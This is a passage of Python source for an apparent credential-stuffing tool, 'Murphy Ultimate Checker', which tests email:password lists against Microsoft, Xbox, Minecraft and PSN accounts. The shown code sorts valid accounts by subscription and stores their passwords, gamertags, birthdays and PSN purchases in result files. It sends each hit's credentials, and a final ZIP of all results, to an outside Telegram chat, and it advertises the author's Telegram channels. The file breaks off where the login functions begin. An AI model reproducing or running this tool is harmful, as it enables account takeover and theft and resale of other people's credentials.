#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         MURPHY ULTIMATE CHECKER                               ║
║                         ─────────────────────                                 ║
║  Developer: Murphython (@Murphython)                                          ║
║  GitHub: https://GitHub.com/sadikmahedi88                                     ║
║                                                                               ║
║  📌 FEATURES:                                                                 ║
║  ┌─────────────────────────────────────────────────────────────────────────┐  ║
║  │  🎮 Xbox Live Account Checker                                           │  ║
║  │  ⛏ Minecraft Account Checker (Java/Bedrock/Dungeons/Legends)          │  ║
║  │  🎮 PSN Purchase Detector (from selected year)                         │  ║
║  │  💼 Microsoft Subscriptions (Game Pass Ultimate/Core/PC, Office 365)   │  ║
║  │  🏆 Xbox Profile (Gamertag, Tier, Reputation)                          │  ║
║  │  🖥️ Live Dashboard with Progress Bars                                   │  ║
║  │  📁 Auto-save results by category                                       │  ║
║  │  🤖 Telegram Bot Integration (Live updates every 10 checks)            │  ║
║  │  💾 Config.json support                                                 │  ║
║  │  🎨 Beautiful Linux-style terminal interface                            │  ║
║  └─────────────────────────────────────────────────────────────────────────┘  ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import subprocess
import sys

# Auto-install missing modules
try:
    import requests
    import urllib3
    import warnings
    from colorama import Fore, Style, init, Back
    MODULES_OK = True
except ImportError:
    MODULES_OK = False

if not MODULES_OK:
    print("Installing required modules...")
    modules = ["requests", "colorama", "urllib3"]
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + modules,
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("✓ Modules installed! Please restart the script.\n")
        time.sleep(2)
        sys.exit(0)
    except:
        print("Failed to install modules. Run: pip install requests colorama urllib3")
        sys.exit(1)

import re
import time
import threading
import concurrent.futures
import os
import json
import uuid
import zipfile
import socket
import getpass
import platform
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import urlparse, parse_qs
from threading import Lock

init(autoreset=True)
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# ═══════════════════════════════════════════════════════════════════
# BEAUTIFUL TERMINAL FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def get_greeting():
    """Return greeting based on time of day"""
    hour = datetime.now().hour
    if hour < 12:
        return "🌅 Good morning"
    elif hour < 18:
        return "🌞 Good afternoon"
    else:
        return "🌙 Good evening"

def get_short_path():
    """Get only the last folder name of current path"""
    current_dir = os.getcwd()
    return os.path.basename(current_dir)

def linux_style_prompt(prompt_text):
    """Create Linux-style input prompt with short path"""
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_dir = get_short_path()
    
    prompt = f"\n{Fore.CYAN}📂{current_dir}{Fore.RESET} "
    prompt += f"{Fore.GREEN}{username}@{hostname}{Fore.RESET}"
    prompt += f"{Fore.WHITE}:{Fore.RESET}{Fore.BLUE}~{Fore.RESET}"
    prompt += f"{Fore.WHITE} {prompt_text} ➜ {Fore.RESET}"
    
    return input(prompt)

def print_info_box(title, items):
    """Print an information box"""
    max_len = max(len(f"{k}: {v}") for k, v in items) + 4
    width = max(max_len, len(title) + 4, 50)
    
    print(f"{Fore.CYAN}┌{'─' * (width - 2)}┐{Fore.RESET}")
    print(f"{Fore.CYAN}│{Fore.WHITE}{title.center(width - 2)}{Fore.CYAN}│{Fore.RESET}")
    print(f"{Fore.CYAN}├{'─' * (width - 2)}┤{Fore.RESET}")
    for key, value in items:
        print(f"{Fore.CYAN}│{Fore.RESET} {Fore.YELLOW}{key}:{Fore.RESET} {Fore.WHITE}{value}{' ' * (width - len(key) - len(str(value)) - 5)}{Fore.CYAN}│{Fore.RESET}")
    print(f"{Fore.CYAN}└{'─' * (width - 2)}┘{Fore.RESET}")

def welcome_screen():
    """Display welcome screen with system info"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Fore.MAGENTA}╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ███╗   ███╗██╗   ██╗██████╗ ██████╗ ██╗  ██╗██╗   ██╗         ║
║   ████╗ ████║██║   ██║██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝         ║
║   ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║ ╚████╔╝          ║
║   ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║  ╚██╔╝           ║
║   ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║   ██║            ║
║   ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝            ║
║                                                                  ║
║                  MURPHY ULTIMATE CHECKER                         ║
║                  ─────────────────────                           ║
║                    @Murphython                                   ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)
    
    # System info box
    username = getpass.getuser()
    hostname = socket.gethostname()
    os_name = platform.system()
    greeting = get_greeting()
    
    info_items = [
        ("🖥️  OS", os_name),
        ("👤 User", username),
        ("💻 Host", hostname),
        ("📅 Time", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
    ]
    print_info_box(f"{greeting}, {username}", info_items)
    print()

# ═══════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════

MY_SIGNATURE = "@Murphython"
GITHUB_URL = "https://GitHub.com/sadikmahedi88"
CHANNELS = {
    "Channel 1": "https://t.me/+sz0r3wI5y6cwMjg0",
    "Channel 2": "https://t.me/+00Uzen6uu10zYTZk",
    "Channel 3": "https://t.me/+zZUKD1RHroA5ODc8",
    "Channel 4": "https://t.me/+Moplh1_mjS8xNjBh"
}

CONFIG_FILE = "config.json"
SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

MAX_RETRIES = 2
REQUEST_TIMEOUT = 15

# Default config
config = {
    "telegram_token": "",
    "telegram_chat_id": "",
    "year_filter": 2024,
    "threads": 50
}

# Global variables
BOT_TOKEN = ""
CHAT_ID = ""
YEAR_FILTER = 2024
THREADS = 50
DEBUG = False
hit_counter = 0
hit_counter_lock = Lock()
telegram_stats_message_id = None
last_update_count = 0

def debug_print(msg):
    if DEBUG:
        print(f"{Fore.YELLOW}[DEBUG] {msg}{Style.RESET_ALL}")

# ═══════════════════════════════════════════════════════════════════
# LOAD / SAVE CONFIG
# ═══════════════════════════════════════════════════════════════════

def load_config():
    global config, BOT_TOKEN, CHAT_ID, YEAR_FILTER, THREADS
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                saved_config = json.load(f)
                config.update(saved_config)
                print(f"  {Fore.GREEN}✓{Fore.RESET} Config loaded from {CONFIG_FILE}")
        except Exception as e:
            print(f"  {Fore.YELLOW}⚠{Fore.RESET} Could not load config: {e}")
    
    BOT_TOKEN = config.get("telegram_token", "")
    CHAT_ID = config.get("telegram_chat_id", "")
    YEAR_FILTER = config.get("year_filter", 2024)
    THREADS = config.get("threads", 50)

def save_config():
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=4)
        print(f"  {Fore.GREEN}✓{Fore.RESET} Config saved to {CONFIG_FILE}")
    except Exception as e:
        print(f"  {Fore.YELLOW}⚠{Fore.RESET} Could not save config: {e}")

def setup_config():
    global BOT_TOKEN, CHAT_ID, YEAR_FILTER, THREADS, config
    
    print(f"\n  {Fore.CYAN}⚙️ CONFIGURATION SETUP{Fore.RESET}")
    print(f"  {Fore.WHITE}{'─'*40}{Fore.RESET}")
    
    # Telegram
    tg_input = linux_style_prompt("Enable Telegram notifications? (y/n)").strip().lower()
    if tg_input == 'y':
        BOT_TOKEN = linux_style_prompt("Bot Token").strip()
        CHAT_ID = linux_style_prompt("Chat ID").strip()
    else:
        BOT_TOKEN = ""
        CHAT_ID = ""
    
    # Year filter
    print(f"\n  {Fore.CYAN}📅 Filter PSN purchases from year:{Fore.RESET}")
    print(f"    {Fore.GREEN}[1]{Fore.RESET} 2024")
    print(f"    {Fore.YELLOW}[2]{Fore.RESET} 2023")
    print(f"    {Fore.BLUE}[3]{Fore.RESET} 2022")
    print(f"    {Fore.MAGENTA}[4]{Fore.RESET} All (no filter)")
    year_choice = linux_style_prompt("Select option").strip()
    if year_choice == '2':
        YEAR_FILTER = 2023
    elif year_choice == '3':
        YEAR_FILTER = 2022
    elif year_choice == '4':
        YEAR_FILTER = 0
    else:
        YEAR_FILTER = 2024
    
    # Threads
    try:
        threads_input = int(linux_style_prompt("Threads (1-200)"))
        THREADS = max(1, min(200, threads_input))
    except:
        THREADS = 50
    
    # Save to config
    config = {
        "telegram_token": BOT_TOKEN,
        "telegram_chat_id": CHAT_ID,
        "year_filter": YEAR_FILTER,
        "threads": THREADS
    }
    save_config()
    
    print(f"  {Fore.GREEN}✓{Fore.RESET} Setup complete!\n")
    time.sleep(1)

# ═══════════════════════════════════════════════════════════════════
# STATISTICS CLASS
# ═══════════════════════════════════════════════════════════════════

class Stats:
    def __init__(self, total=0):
        self.total = total
        self.checked = 0
        self.valid = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.psn_hits = 0
        self.psn_orders = 0
        self.ultimate = 0
        self.core = 0
        self.pc = 0
        self.minecraft_java = 0
        self.minecraft_bedrock = 0
        self.minecraft_dungeons = 0
        self.minecraft_legends = 0
        self.office = 0
        self.xbox_only = 0
        self.premium = 0
        self.current_email = ""
        self.start_time = time.time()
        self.lock = Lock()
    
    def update(self, status, category_data=None):
        with self.lock:
            self.checked += 1
            if status == "VALID":
                self.valid += 1
            elif status == "2FA":
                self.twofa += 1
            elif status == "BAD":
                self.bad += 1
            else:
                self.errors += 1
            
            if category_data:
                if category_data.get('psn_hits'):
                    self.psn_hits += 1
                    self.psn_orders += category_data.get('psn_orders', 0)
                if category_data.get('ultimate'):
                    self.ultimate += 1
                if category_data.get('core'):
                    self.core += 1
                if category_data.get('pc'):
                    self.pc += 1
                if category_data.get('minecraft_java'):
                    self.minecraft_java += 1
                if category_data.get('minecraft_bedrock'):
                    self.minecraft_bedrock += 1
                if category_data.get('minecraft_dungeons'):
                    self.minecraft_dungeons += 1
                if category_data.get('minecraft_legends'):
                    self.minecraft_legends += 1
                if category_data.get('office'):
                    self.office += 1
                if category_data.get('xbox_only'):
                    self.xbox_only += 1
                if category_data.get('premium'):
                    self.premium += 1
    
    def get_cpm(self):
        elapsed = time.time() - self.start_time
        return int((self.checked / elapsed) * 60) if elapsed > 0 else 0
    
    def get_elapsed(self):
        return str(timedelta(seconds=int(time.time() - self.start_time)))
    
    def get_stats_text(self):
        with self.lock:
            pct = (self.checked / self.total * 100) if self.total > 0 else 0
            cpm = self.get_cpm()
            elapsed = self.get_elapsed()
            
            text = f"""🤖 MURPHY CHECKER - LIVE

✅ VALID: {self.valid:,}
🎮 PSN: {self.psn_hits:,}
   └─ ORDERS: {self.psn_orders:,}
💜 ULTIMATE: {self.ultimate:,}
💙 CORE: {self.core:,}
💚 PC: {self.pc:,}
⛏ MINECRAFT: {self.minecraft_java:,}
   ├─ JAVA: {self.minecraft_java:,}"""
            
            if self.minecraft_bedrock > 0:
                text += f"\n   ├─ BEDROCK: {self.minecraft_bedrock:,}"
            if self.minecraft_dungeons > 0:
                text += f"\n   └─ DUNGEONS: {self.minecraft_dungeons:,}"
            
            text += f"""
📊 OFFICE 365: {self.office:,}
❌ INVALID: {self.bad:,}
🔐 2FA: {self.twofa:,}
🏆 PREMIUM: {self.premium:,}

📊 PROGRESS: {self.checked:,}/{self.total:,} ({pct:.1f}%)
🚀 CPM: {cpm:,}
⏱️ TIME: {elapsed}

👨‍💻 Dev: {MY_SIGNATURE}"""
            
            return text

stats = Stats()

# ═══════════════════════════════════════════════════════════════════
# COLORED TABLE FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

class TableColors:
    HEADER = Fore.CYAN + Style.BRIGHT
    BORDER = Fore.BLUE + Style.DIM
    VALID = Fore.GREEN + Style.BRIGHT
    PSN = Fore.BLUE + Style.BRIGHT
    ULTIMATE = Fore.MAGENTA + Style.BRIGHT
    CORE = Fore.CYAN + Style.BRIGHT
    PC = Fore.GREEN + Style.BRIGHT
    OFFICE = Fore.YELLOW + Style.BRIGHT
    MINECRAFT = Fore.GREEN + Style.BRIGHT
    INVALID = Fore.RED + Style.BRIGHT
    TWOFA = Fore.YELLOW + Style.BRIGHT
    PROGRESS_BAR = Fore.GREEN
    PROGRESS_EMPTY = Fore.BLACK + Style.DIM
    PREMIUM = Fore.YELLOW + Style.BRIGHT
    RESET = Style.RESET_ALL

def make_bar(percent, width=20):
    filled = int(width * percent / 100) if percent > 0 else 0
    empty = width - filled
    return f"{TableColors.PROGRESS_BAR}{'█' * filled}{TableColors.PROGRESS_EMPTY}{'░' * empty}{TableColors.RESET}"

def print_live_table():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Fore.MAGENTA}╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ███╗   ███╗██╗   ██╗██████╗ ██████╗ ██╗  ██╗██╗   ██╗         ║
║   ████╗ ████║██║   ██║██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝         ║
║   ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║ ╚████╔╝          ║
║   ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║  ╚██╔╝           ║
║   ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║   ██║            ║
║   ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝            ║
║                                                                  ║
║                  MURPHY ULTIMATE CHECKER                         ║
║                  ─────────────────────                           ║
║                    @Murphython                                   ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)
    
    with stats.lock:
        total = stats.total
        checked = stats.checked
        valid = stats.valid
        bad = stats.bad
        twofa = stats.twofa
        psn_hits = stats.psn_hits
        psn_orders = stats.psn_orders
        ultimate = stats.ultimate
        core = stats.core
        pc = stats.pc
        minecraft_java = stats.minecraft_java
        minecraft_bedrock = stats.minecraft_bedrock
        minecraft_dungeons = stats.minecraft_dungeons
        office = stats.office
        premium = stats.premium
        current_email = stats.current_email
        cpm = stats.get_cpm()
        elapsed = stats.get_elapsed()
    
    total_checked = checked if checked > 0 else 1
    valid_pct = (valid / total_checked * 100)
    psn_pct = (psn_hits / total_checked * 100)
    ultimate_pct = (ultimate / total_checked * 100)
    core_pct = (core / total_checked * 100)
    pc_pct = (pc / total_checked * 100)
    office_pct = (office / total_checked * 100)
    bad_pct = (bad / total_checked * 100)
    twofa_pct = (twofa / total_checked * 100)
    mc_pct = (minecraft_java / total_checked * 100)
    premium_pct = (premium / total_checked * 100)
    
    print(f"{TableColors.BORDER}┌──────────────────────────────┬────────────┬──────────┬────────────────────┐")
    print(f"│{TableColors.HEADER}           STATUS{TableColors.BORDER}             │{TableColors.HEADER}   COUNT{TableColors.BORDER}    │{TableColors.HEADER} PERCENT{TableColors.BORDER}  │{TableColors.HEADER}     PROGRESS{TableColors.BORDER}       │")
    print(f"├──────────────────────────────┼────────────┼──────────┼────────────────────┤")
    print(f"│  {TableColors.VALID}✅ VALID{TableColors.RESET}{TableColors.BORDER}                    │  {TableColors.VALID}{valid:>8,}{TableColors.BORDER}  │  {valid_pct:>5.1f}%   │ {make_bar(valid_pct)} │")
    print(f"│  {TableColors.PREMIUM}🏆 PREMIUM{TableColors.RESET}{TableColors.BORDER}                  │  {TableColors.PREMIUM}{premium:>8,}{TableColors.BORDER}  │  {premium_pct:>5.1f}%   │ {make_bar(premium_pct)} │")
    print(f"│  {TableColors.PSN}🎮 PSN{TableColors.RESET}{TableColors.BORDER}                      │  {TableColors.PSN}{psn_hits:>8,}{TableColors.BORDER}  │  {psn_pct:>5.1f}%   │ {make_bar(psn_pct)} │")
    print(f"│     └─ {TableColors.PSN}Orders{TableColors.RESET}{TableColors.BORDER}                │  {TableColors.PSN}{psn_orders:>8,}{TableColors.BORDER}  │          │                    │")
    print(f"│  {TableColors.ULTIMATE}💜 GAME PASS{TableColors.RESET}{TableColors.BORDER}                │            │          │                    │")
    print(f"│     ├─ {TableColors.ULTIMATE}ULTIMATE{TableColors.RESET}{TableColors.BORDER}              │  {TableColors.ULTIMATE}{ultimate:>8,}{TableColors.BORDER}  │  {ultimate_pct:>5.1f}%   │ {make_bar(ultimate_pct)} │")
    print(f"│     ├─ {TableColors.CORE}CORE{TableColors.RESET}{TableColors.BORDER}                    │  {TableColors.CORE}{core:>8,}{TableColors.BORDER}  │  {core_pct:>5.1f}%   │ {make_bar(core_pct)} │")
    print(f"│     └─ {TableColors.PC}PC{TableColors.RESET}{TableColors.BORDER}                      │  {TableColors.PC}{pc:>8,}{TableColors.BORDER}  │  {pc_pct:>5.1f}%   │ {make_bar(pc_pct)} │")
    print(f"│  {TableColors.OFFICE}📊 OFFICE 365{TableColors.RESET}{TableColors.BORDER}                │  {TableColors.OFFICE}{office:>8,}{TableColors.BORDER}  │  {office_pct:>5.1f}%   │ {make_bar(office_pct)} │")
    print(f"│  {TableColors.MINECRAFT}⛏ MINECRAFT{TableColors.RESET}{TableColors.BORDER}                  │  {TableColors.MINECRAFT}{minecraft_java:>8,}{TableColors.BORDER}  │  {mc_pct:>5.1f}%   │ {make_bar(mc_pct)} │")
    print(f"│     ├─ {TableColors.MINECRAFT}JAVA{TableColors.RESET}{TableColors.BORDER}                   │  {TableColors.MINECRAFT}{minecraft_java:>8,}{TableColors.BORDER}  │          │                    │")
    if minecraft_bedrock > 0:
        print(f"│     ├─ {TableColors.MINECRAFT}BEDROCK{TableColors.RESET}{TableColors.BORDER}                 │  {TableColors.MINECRAFT}{minecraft_bedrock:>8,}{TableColors.BORDER}  │          │                    │")
    if minecraft_dungeons > 0:
        print(f"│     └─ {TableColors.MINECRAFT}DUNGEONS{TableColors.RESET}{TableColors.BORDER}                │  {TableColors.MINECRAFT}{minecraft_dungeons:>8,}{TableColors.BORDER}  │          │                    │")
    print(f"│  {TableColors.INVALID}❌ INVALID{TableColors.RESET}{TableColors.BORDER}                  │  {TableColors.INVALID}{bad:>8,}{TableColors.BORDER}  │  {bad_pct:>5.1f}%   │ {make_bar(bad_pct)} │")
    print(f"│  {TableColors.TWOFA}🔐 2FA{TableColors.RESET}{TableColors.BORDER}                      │  {TableColors.TWOFA}{twofa:>8,}{TableColors.BORDER}  │  {twofa_pct:>5.1f}%   │ {make_bar(twofa_pct)} │")
    print(f"├──────────────────────────────┴────────────┴──────────┴────────────────────┤")
    print(f"│  📊 TOTAL: {total:,}    ✅ CHECKED: {checked:,}    🚀 CPM: {cpm:,}    ⏱️ TIME: {elapsed}  │")
    print(f"│  📧 CURRENT: {current_email[:55]}{' ' * (55 - len(current_email[:55]))}│")
    print(f"└────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")

# ═══════════════════════════════════════════════════════════════════
# FOLDERS & FILE MANAGEMENT
# ═══════════════════════════════════════════════════════════════════

def create_folders():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_folder = Path(f"Results/Murphy_{timestamp}")
    base_folder.mkdir(parents=True, exist_ok=True)
    
    hits_folder = base_folder / "Hits"
    details_folder = base_folder / "Details"
    reports_folder = base_folder / "Reports"
    
    hits_folder.mkdir(exist_ok=True)
    details_folder.mkdir(exist_ok=True)
    reports_folder.mkdir(exist_ok=True)
    
    files = {
        "premium": hits_folder / "premium_hits.txt",
        "ultimate": hits_folder / "ultimate.txt",
        "core": hits_folder / "core.txt",
        "pc": hits_folder / "pc.txt",
        "game_pass": hits_folder / "game_pass.txt",
        "minecraft_java": hits_folder / "minecraft_java.txt",
        "minecraft_bedrock": hits_folder / "minecraft_bedrock.txt",
        "minecraft_dungeons": hits_folder / "minecraft_dungeons.txt",
        "office": hits_folder / "office_365.txt",
        "psn": hits_folder / "psn_hits.txt",
        "xbox_only": hits_folder / "xbox_only.txt",
        "valid": hits_folder / "valid.txt",
        "twofa": hits_folder / "2fa.txt",
        "detailed": details_folder / "detailed.txt",
        "summary": reports_folder / "summary.txt"
    }
    
    for file in files.values():
        file.parent.mkdir(parents=True, exist_ok=True)
    
    return base_folder, files

base_folder, files = create_folders()

def get_file_header(file_type, description):
    """Generate header for result files"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    channels_text = "\n".join([f"#  📢 {name}: {url}" for name, url in CHANNELS.items()])
    
    header = f"""################################################################
#                    {file_type.upper()}
#                    {description}
################################################################
#                                                              #
#  📅 Generated: {timestamp}
#  👨‍💻 Developer: {MY_SIGNATURE}
#  🐙 GitHub: {GITHUB_URL}
{channels_text}
#                                                              #
################################################################

"""
    return header

def save_hit(file_key, content):
    try:
        file_path = files[file_key]
        if not file_path.exists() or file_path.stat().st_size == 0:
            header = get_file_header(file_key.replace("_", " "), "Accounts found by Murphy Checker")
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(header)
        
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(content + '\n')
    except Exception as e:
        debug_print(f"Error saving {file_key}: {e}")

def save_valid(email, password):
    file_path = files["valid"]
    if not file_path.exists() or file_path.stat().st_size == 0:
        header = get_file_header("BASIC ACCOUNTS", "Valid Microsoft accounts without subscriptions")
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(header)
    
    with open(file_path, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password} | by {MY_SIGNATURE}\n")

def save_premium_hit(email, password, subscriptions, gamertag, ultimate, minecraft_java, psn_orders):
    subs_str = ", ".join(subscriptions) if subscriptions else "None"
    line = f"{email}:{password} | 🎮 Gamertag: {gamertag} | 💜 Ultimate: {'Yes' if ultimate else 'No'} | ⛏ Minecraft: {'Yes' if minecraft_java else 'No'} | 🎮 PSN: {psn_orders} | 💼 Subs: {subs_str} | by {MY_SIGNATURE}"
    save_hit("premium", line)
    
    if ultimate:
        save_hit("ultimate", f"{email}:{password} | {subs_str} | by {MY_SIGNATURE}")
    if minecraft_java:
        save_hit("minecraft_java", f"{email}:{password} | {subs_str} | by {MY_SIGNATURE}")
    if psn_orders > 0:
        save_hit("psn", f"{email}:{password} | Orders: {psn_orders} | by {MY_SIGNATURE}")
    if "Office 365" in subs_str:
        save_hit("office", f"{email}:{password} | {subs_str} | by {MY_SIGNATURE}")

def save_detailed(email, password, data, is_premium=False):
    if not is_premium:
        return
    
    with open(files["detailed"], 'a', encoding='utf-8') as f:
        f.write(f"\n{'═'*70}\n")
        f.write(f"📧 Email: {email}\n")
        f.write(f"🔑 Password: {password}\n")
        
        if data.get('birthday') and data['birthday'] != 'Unknown':
            f.write(f"🎂 Birthday: {data['birthday']}")
            if data.get('age') and data['age'] != 'Unknown':
                f.write(f" (Age: {data['age']})")
            f.write("\n")
        
        if data.get('subscriptions'):
            f.write(f"💼 Subscriptions:\n")
            for sub in data['subscriptions']:
                f.write(f"   • {sub}\n")
        else:
            f.write(f"⚠️ No subscriptions found\n")
        
        if data.get('xbox_profile') and data['xbox_profile'].get('gamertag') != 'N/A':
            xp = data['xbox_profile']
            f.write(f"🎮 Xbox Profile:\n")
            f.write(f"   • Gamertag: {xp.get('gamertag', 'N/A')}\n")
            f.write(f"   • Tier: {xp.get('tier', 'N/A')}\n")
            f.write(f"   • Reputation: {xp.get('rep', 'N/A')}\n")
        else:
            f.write(f"⚠️ No Xbox profile found\n")
        
        if data.get('minecraft_profile') and data['minecraft_profile'].get('name') != 'Not Set':
            mp = data['minecraft_profile']
            f.write(f"⛏ Minecraft:\n")
            f.write(f"   • Name: {mp.get('name', 'N/A')}\n")
            f.write(f"   • UUID: {mp.get('uuid', 'N/A')}\n")
            if mp.get('capes'):
                f.write(f"   • Capes: {', '.join(mp['capes'])}\n")
        else:
            f.write(f"⚠️ No Minecraft profile found\n")
        
        if data.get('psn_orders', 0) > 0:
            f.write(f"🎮 PSN Orders: {data['psn_orders']}\n")
            if data.get('psn_purchases'):
                f.write(f"   📦 Recent Purchases:\n")
                for p in data['psn_purchases'][:5]:
                    f.write(f"      • {p.get('item', 'Unknown')}\n")
                    if p.get('price'):
                        f.write(f"        💰 {p['price']} | 📅 {p.get('date', 'N/A')}\n")
        
        f.write(f"\n👨‍💻 Developer: {MY_SIGNATURE}\n")
        f.write(f"{'═'*70}\n")

def save_2fa(email, password):
    file_path = files["twofa"]
    if not file_path.exists() or file_path.stat().st_size == 0:
        header = get_file_header("2FA ACCOUNTS", "Accounts requiring two-factor authentication")
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(header)
    
    with open(file_path, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password} | by {MY_SIGNATURE}\n")

def create_zip_report():
    zip_path = base_folder.parent / f"Murphy_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file_path in base_folder.rglob('*'):
            if file_path.is_file():
                zipf.write(file_path, file_path.relative_to(base_folder.parent))
    
    return zip_path

# ═══════════════════════════════════════════════════════════════════
# TELEGRAM BOT
# ═══════════════════════════════════════════════════════════════════

class TelegramBot:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.enabled = bool(token and chat_id)
        self.stats_message_id = None
    
    def send_stats_message(self, text):
        """Send initial stats message and store message_id"""
        if not self.enabled:
            return None
        try:
            response = requests.post(
                f"{self.base_url}/sendMessage",
                data={"chat_id": self.chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True},
                timeout=30
            )
            if response.status_code == 200:
                data = response.json()
                self.stats_message_id = data.get('result', {}).get('message_id')
                return self.stats_message_id
        except Exception as e:
            debug_print(f"Send stats message error: {e}")
        return None
    
    def update_stats_message(self, text):
        """Update existing stats message (edit, not send new)"""
        if not self.enabled or not self.stats_message_id:
            return False
        try:
            response = requests.post(
                f"{self.base_url}/editMessageText",
                data={"chat_id": self.chat_id, "message_id": self.stats_message_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True},
                timeout=30
            )
            return response.status_code == 200
        except Exception as e:
            debug_print(f"Update stats message error: {e}")
            return False
    
    def send_hit_message(self, hit_number, email, password, gamertag, ultimate, minecraft_java, psn_orders, subscriptions):
        """Send hit notification to Telegram"""
        if not self.enabled:
            return False
        
        channels_text = "\n".join([f"<b>📢 {name}:</b> <a href='{url}'>{name}</a>" for name, url in CHANNELS.items()])
        
        text = (
            f"<b>✨ Murphy Checker - New Hit #{hit_number}</b>\n\n"
            f"<b>📧 Email:</b> <code>{email}</code>\n"
            f"<b>🔑 Password:</b> <code>{password}</code>\n"
            f"<b>🎮 Gamertag:</b> {gamertag}\n"
            f"<b>💜 Ultimate:</b> {'✅ Yes' if ultimate else '❌ No'}\n"
            f"<b>⛏ Minecraft Java:</b> {'✅ Yes' if minecraft_java else '❌ No'}\n"
            f"<b>🎮 PSN Orders:</b> {psn_orders}\n"
            f"<b>💼 Subscriptions:</b> {', '.join(subscriptions) if subscriptions else 'None'}\n\n"
            f"<b>👨‍💻 Developer:</b> <a href='https://t.me/Murphython'>{MY_SIGNATURE}</a>\n"
            f"{channels_text}\n"
            f"<b>🐙 GitHub:</b> <a href='{GITHUB_URL}'>sadikmahedi88</a>"
        )
        
        url = f"{self.base_url}/sendMessage"
        data = {
            'chat_id': self.chat_id,
            'text': text,
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }
        
        try:
            response = requests.post(url, data=data, timeout=30)
            return response.status_code == 200
        except Exception as e:
            debug_print(f"Send hit message error: {e}")
            return False
    
    def send_document(self, file_path, caption=""):
        if not self.enabled:
            return False
        try:
            if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                return False
            
            with open(file_path, 'rb') as f:
                response = requests.post(
                    f"{self.base_url}/sendDocument",
                    files={"document": f},
                    data={"chat_id": self.chat_id, "caption": caption, "parse_mode": "HTML", "disable_web_page_preview": True},
                    timeout=60
                )
            return response.status_code == 200
        except Exception as e:
            debug_print(f"Send document error: {e}")
            return False

bot = None

def update_telegram_stats():
    global last_update_count
    if not bot or not bot.enabled:
        return
    
    with stats.lock:
        current_count = stats.checked
    
    # Update every 10 checks
    if current_count // 10 > last_update_count:
        last_update_count = current_count // 10
        msg = stats.get_stats_text()
        bot.update_stats_message(msg)

def send_telegram_hit(hit_number, email, password, gamertag, ultimate, minecraft_java, psn_orders, subscriptions):
    if not bot or not bot.enabled:
        return
    bot.send_hit_message(hit_number, email, password, gamertag, ultimate, minecraft_java, psn_orders, subscriptions)

def send_telegram_final_report(zip_path):
    if not bot or not bot.enabled:
        return
    
    # Update final stats message
    final_msg = stats.get_stats_text().replace("LIVE", "✅ DONE")
    bot.update_stats_message(final_msg)
    
    time.sleep(2)
    
    # Send ZIP file
    channels_text = "\n".join([f"📢 {name}: {url}" for name, url in CHANNELS.items()])
    caption = f"""<b>📦 Murphy Checker - Complete Report</b>

<b>✅ Valid:</b> {stats.valid:,}
<b>🏆 Premium:</b> {stats.premium:,}
<b>🎮 PSN Hits:</b> {stats.psn_hits:,}
<b>💜 Ultimate:</b> {stats.ultimate:,}
<b>⛏ Minecraft Java:</b> {stats.minecraft_java:,}

<b>👨‍💻 Dev:</b> {MY_SIGNATURE}
{channels_text}
<b>🐙 GitHub:</b> {GITHUB_URL}"""
    
    bot.send_document(str(zip_path), caption)

# ═══════════════════════════════════════════════════════════════════
# AUTHENTICATION FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def get_sftag(session):
